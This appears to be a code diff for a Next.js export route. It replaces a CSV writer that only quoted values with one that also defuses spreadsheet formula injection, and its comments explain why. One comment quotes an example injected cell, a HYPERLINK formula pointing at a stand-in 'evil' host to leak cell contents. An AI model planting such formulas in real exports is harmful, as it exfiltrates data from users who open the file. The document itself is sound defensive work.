@@ -2,17 +2,19 @@ import { NextResponse } from "next/server";
 import { createClient } from "@/lib/supabase/server";
 import { logApiError } from "@/lib/log-error";
 import { allowExport } from "@/lib/export-guard";
-import { toCsv } from "@/lib/data-analysis/store";
+import { toCSV } from "@/lib/download/table-csv";
 
 export const dynamic = "force-dynamic";
 
 /**
  * EXPORT — the parsed table back out, or the findings as JSON.
  *
- * The CSV is written with proper quoting, so a value containing a comma,
- * a quote or a newline round-trips back through our own parser unchanged.
- * That is the only definition of "export" worth having: a file the user
- * can put somewhere else and still have their data.
+ * The CSV is written by lib/download/table-csv.ts, which quotes AND
+ * defuses: a value containing a comma, a quote or a newline round-trips
+ * back through our own parser unchanged, and a value that would be a
+ * formula in Excel does not execute there. Both halves matter — a file
+ * the user can put somewhere else and still have their data, and open
+ * without being attacked by it.
  *
  * The filename is sanitised rather than trusted. A stored title
  * containing a quote or a newline would otherwise break out of the
@@ -74,7 +76,15 @@ export async function GET(request: Request, props: { params: Promise<{ id: strin
       });
     }
 
-    const csv = toCsv((analysis.headers ?? []) as string[], (analysis.rows ?? []) as string[][]);
+    // lib/download/table-csv.ts, NOT a second writer of our own. This
+    // route used store.ts's toCsv, which quoted and shipped the payload
+    // intact: a cell beginning `=`, `@` or `+`/`-` reached the user's
+    // Excel and was executed there, and the data-analysis upload stores
+    // rows verbatim, so a supplier's price list carrying
+    // `=HYPERLINK("http://evil/?"&A1,"Click")` survived upload, storage
+    // and download. Quoting is not a defence — Excel strips CSV quotes
+    // before it evaluates the cell. escapeCSVValue defuses first.
+    const csv = toCSV((analysis.headers ?? []) as string[], (analysis.rows ?? []) as string[][]);
     return new NextResponse(csv, {
       headers: {
         "Content-Type": "text/csv; charset=utf-8",
